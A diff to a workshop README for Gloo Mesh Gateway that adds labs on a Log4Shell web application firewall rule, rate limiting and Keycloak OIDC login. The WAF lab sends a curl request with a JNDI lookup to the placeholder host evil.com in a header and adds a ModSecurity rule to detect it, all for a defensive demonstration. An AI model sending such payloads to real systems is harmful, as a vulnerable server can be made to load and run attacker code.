@@ -11,8 +11,12 @@
 * [Lab 4 - Deploy Online Boutique Sample Application](#Lab-4)
 * [Lab 5 - Configure Gloo Mesh](#Lab-5)
 * [Lab 6 - Routing](#Lab-6)
-* [Lab 7 - Policies](#Lab-7)
-* [Lab 8 - Security](#Lab-8)
+* [Lab 7 - GRPC to JSON Transcoding](#Lab-7)
+* [Lab 8 - Web Application Firewall](#Lab-8)
+* [Lab 9 - Rate Limiting](#Lab-9)
+* [Lab 10 - Authentication / API Key](#Lab-10)
+* [Lab 11 - Authentication / JWT + JWKS](#Lab-11)
+* [Lab 12 - Authentication / OIDC ](#Lab-12)
 
 ## Introduction <a name="introduction"></a>
 
@@ -23,7 +27,7 @@ To get started with this workshop, clone this repo.
 
 ```sh
 git clone https://github.com/solo-io/solo-cop.git
-cd solo-cop/workshops/gloo-gateway-demo && git checkout v1.0.2
+cd solo-cop/workshops/gloo-gateway-demo && git checkout v1.1.0
 ```
 
 Set these environment variables which will be used throughout the workshop.
@@ -88,13 +92,13 @@ kubectl apply -f tracks/addons-servers.yaml
 
 ![online-boutique](images/online-boutique.png)
 
-1. Deploy the Online Boutique backend microservices to `cluster1` in the `backend-apis` namespace.
+1. Deploy the Online Boutique backend microservices to the `backend-apis` namespace.
 
 ```sh
 kubectl apply -f install/online-boutique/backend-apis.yaml
 ```
 
-2. Deploy the frontend microservice to the `web-ui` namespace in `cluster1`.
+2. Deploy the frontend microservice to the `web-ui` namespace.
 
 ```sh
 kubectl apply -f install/online-boutique/web-ui.yaml
@@ -114,7 +118,7 @@ spec:
   workloadClusters:
   - name: '*'
     namespaces:
-    - name: ops-team
+    - name: ops-team     ### Configuration Namespace
     - name: gloo-gateway
     - name: gloo-gateway-addons
 ---
@@ -127,7 +131,7 @@ spec:
   workloadClusters:
   - name: '*'
     namespaces:
-    - name: dev-team
+    - name: dev-team  ### Configuration Namespace
     - name: web-ui
     - name: backend-apis
 EOF
@@ -358,6 +362,169 @@ TODO Grpc to json
 ## Lab 8 - Security <a name="Lab-8"></a>
 
 
+
+#### Web Application Firewall (WAF)
+
+Gloo Mesh Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.
+
+In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.
+
+1. Refer to following diagram from Swiss CERT to learn how the `log4j` attack works. Note that a JNDI lookup is inserted into a header field that is logged.
+![log4j exploit](./images/log4j_attack.png)
+
+2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
+
+```sh
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT/httpbin/get
+```
+
+3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
+
+  * In the route table, the frontend route has the label `route: httpbin`. The WAF policy applies to routes with this same label.
+  * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
+
+```yaml
+kubectl --context ${MGMT} apply -f - <<'EOF'
+apiVersion: security.policy.gloo.solo.io/v2
+kind: WAFPolicy
+metadata:
+  name: log4jshell
+  namespace: dev-team
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        route: httpbin ##### NOTE
+  config:
+    disableCoreRuleSet: true
+    customInterventionMessage: 'Log4Shell malicious payload'
+    customRuleSets:
+    - ruleStr: |
+        SecRuleEngine On
+        SecRequestBodyAccess On
+        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
+          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
+          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+4. Try the previous request again.
+
+```sh
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT/httpbin/get
+```
+
+Note that the request is now blocked with the custom intervention message from the WAF policy.
+
+```sh
+HTTP/2 403
+content-length: 27
+content-type: text/plain
+date: Wed, 18 May 2022 21:20:34 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
+
+Your frontend app is no longer susceptible to `log4j` attacks, nice!
+
+
+### 3. Add Rate Limiting
+
+Secondly, we will look at rate limiting with Gloo Mesh Gateway.  The rate limiting feature relies on a rate limit server that has been installed in our gloo-mesh-addons namespace.
+
+For rate limiting, we need to create three CRs.  Let's start with the `RateLimitClientConfig`.
+
+The `RateLimitClientConfig` defines the conditions in the request that will invoke rate limiting.  In this case, we will define a key coming from the header `X-Organization`.
+
+The `RateLimitPolicy` pulls together the `RateLimitClientConfig`, `RateLimitServerConfig` and sets the label selector to use in the `RouteTable`.
+
+* Apply the `RateLimitPolicy`
+
+```yaml
+kubectl apply -f - <<'EOF'
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: RateLimitClientConfig
+metadata:
+  name: rate-limit-client-config
+  namespace: dev-team
+spec:
+  raw:
+    rateLimits:
+    - actions:
+      - genericKey:
+          descriptorValue: counter
+---
+apiVersion: admin.gloo.solo.io/v2
+kind: RateLimitServerConfig
+metadata:
+  name: rate-limit-server-config
+  namespace: dev-team
+spec:
+  destinationServers:
+  - ref:
+      cluster: mgmt-cluster
+      name: rate-limiter
+      namespace: gloo-gateway-addons
+    port:
+      name: grpc
+  raw:
+    descriptors:
+    - key: generic_key
+      rateLimit:
+        requestsPerUnit: 3
+        unit: MINUTE
+      value: counter
+---
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: RateLimitPolicy
+metadata:
+  name: rate-limit-policy
+  namespace: dev-team
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        route: httpbin ##### NOTE
+  config:
+    serverSettings:
+      name: rate-limit-server-settings
+      namespace: dev-team
+      cluster: mgmt-cluster
+    ratelimitClientConfig:
+      name: rate-limit-client-config
+      namespace: dev-team
+      cluster: mgmt-cluster
+    ratelimitServerConfig:
+      name: rate-limit-server-config
+      namespace: dev-team
+      cluster: mgmt-cluster
+    phase:
+      preAuthz: { }
+EOF
+```
+
+* Test Rate Limiting
+
+```sh
+for i in {1..6}; do curl -iksS -X GET http://$HTTP_GATEWAY_ENDPOINT | tail -n 10; done
+```
+
+* Expected Response - If you try the Online Boutique UI you will see a blank page because the rate-limit response is in the headers
+
+```sh
+HTTP/2 429
+x-envoy-ratelimited: true
+date: Sun, 05 Jun 2022 18:50:53 GMT
+server: istio-envoy
+x-envoy-upstream-service-time: 7
+```
+
+
+
+### Authentication
+
+
 ```
 echo -n "admin" | base64
 YWRtaW4=
@@ -508,4 +675,106 @@ grpcurl -H "Authorization: Bearer ${AUTH_TOKEN}" --plaintext --proto ./install/o
 
 ```
 
-* OIDC - Auth0/Keycloak?
+
+#### External Authorization (OIDC)
+
+Another valuable feature of API gateways is integration into your IdP (Identity Provider). In this section of the lab, we see how Gloo Mesh Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
+
+1. In order for OIDC to work we need to enable HTTPS on our gateway. For this demo, we will create and upload a self-signed certificate which will be used in the gateway for TLS termination.
+
+```sh
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
+   -keyout tls.key -out tls.crt -subj "/CN=*"
+
+kubectl -n istio-gateways create secret generic tls-secret \
+--from-file=tls.key=tls.key \
+--from-file=tls.crt=tls.crt
+```
+
+2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate
+```yaml
+kubectl apply -f - <<'EOF'
+apiVersion: networking.gloo.solo.io/v2
+kind: VirtualGateway
+metadata:
+  name: north-south-gw
+  namespace: ops-team
+spec:
+  workloads:
+    - selector:
+        labels:
+          istio: ingressgateway
+        cluster: mgmt-cluster
+        namespace: gloo-gateway
+  listeners:
+    - http: {}
+      port:
+        number: 80
+      httpsRedirect: true
+    - http: {}
+      port:
+        number: 443
+      tls:
+        mode: SIMPLE
+        secretName: tls-secret # NOTE
+      allowedRouteTables:
+        - host: '*'
+          selector:
+            workspace: ops-team
+EOF
+```
+
+3. Test out the new HTTPS endpoint (you may need to allow insecure traffic in your browser. Chrome: Advanced -> Proceed)
+
+```sh
+export ENDPOINT_HTTPS_GW_CLUSTER1_EXT=$(kubectl -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):443
+echo "Secure Online Boutique URL: https://$ENDPOINT_HTTPS_GW_CLUSTER1_EXT"
+```
+
+4. Finally, we need to deploy our OIDC server keycloak. We provided you with a script to deploy and configure keycloak for our workshop. 
+
+* Deploy and configure Keycloak
+
+* Deploy Keycloak
+
+```sh
+./install/keycloak/setup.sh
+```
+
+Get the keycloak URL and Client ID.
+
+```sh
+export KEYCLOAK_URL=$(kubectl get configmap -n gloo-mesh keycloak-info -o json | jq -r '.data."keycloak-url"')
+export KEYCLOAK_CLIENTID=$(kubectl get configmap -n gloo-mesh keycloak-info -o json | jq -r '.data."client-id"')
+
+echo "Keycloak available at: $KEYCLOAK_URL"
+echo "Keycloak OIDC ClientID: $KEYCLOAK_CLIENTID"
+```
+
+The `ExtAuthPolicy` defines the provider connectivity including any callback paths that we need to configure on our application.
+
+* View the `ExtAuthPolicy` with environment variables replaced.
+
+```sh
+( echo "cat <<EOF" ; cat tracks/06-api-gateway/ext-auth-policy.yaml ; echo EOF ) | sh
+```
+
+* Apply the `ExtAuthPolicy`
+
+```sh
+( echo "cat <<EOF" ; cat tracks/06-api-gateway/ext-auth-policy.yaml ; echo EOF ) | sh | kubectl apply -n dev-team -f -
+```
+
+Now if you refresh the application, you should be redirected to Keycloak to login.
+
+* Login using the following credentials
+
+```sh
+user: gloo-mesh
+password: solo.io
+```
+
+And the application is now accessible.
+
+
+* When you are finished, click the 'logout' button in the top right corner of the screen.
